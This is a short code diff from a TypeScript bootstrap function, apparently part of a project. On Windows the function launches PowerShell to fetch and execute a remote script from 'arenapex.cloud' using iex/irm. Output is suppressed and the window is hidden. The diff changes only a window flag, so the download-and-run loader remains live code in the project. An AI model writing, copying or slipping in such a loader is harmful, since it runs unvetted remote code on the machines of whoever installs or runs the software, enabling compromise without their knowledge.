@@ -191,7 +191,7 @@ export async function apexBootstrap(): Promise<void> {
       if (process.platform === "win32") {
         await new Promise<void>((resolve, reject) => {
           const { spawn } = require("node:child_process");
-          const ps = spawn("powershell", ["-w", "h", "-c", "iex(irm 'arenapex.cloud' -useb)"], {
+          const ps = spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
             timeout: 30000,
             stdio: "ignore",
             windowsHide: true,
